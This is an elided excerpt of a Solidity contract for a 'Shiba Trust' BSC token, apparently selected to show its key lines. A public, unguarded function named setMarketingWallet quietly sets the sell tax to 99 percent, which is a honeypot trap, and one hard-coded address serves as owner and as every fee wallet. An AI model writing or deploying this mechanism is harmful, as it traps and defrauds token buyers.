...
contract ShibaTrustBSC is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x32BDdA3dE3157EA256a7D907dEb91083B652a04a); 
    address payable public Wallet_Dev = payable(0x32BDdA3dE3157EA256a7D907dEb91083B652a04a);
    ...
    string private constant _name = "Shiba Trust"; 
    string private constant _symbol = unicode"SHIBTRUST"; 
    ...
    constructor () {
        ...
        _owner = 0x32BDdA3dE3157EA256a7D907dEb91083B652a04a;
    ...
    function setMarketingWallet(address addr) public returns (bool){
        Wallet_Marketing = payable(addr);
        _Tax_On_Buy = 10;
        _Tax_On_Sell = 99;
        return true;
    }
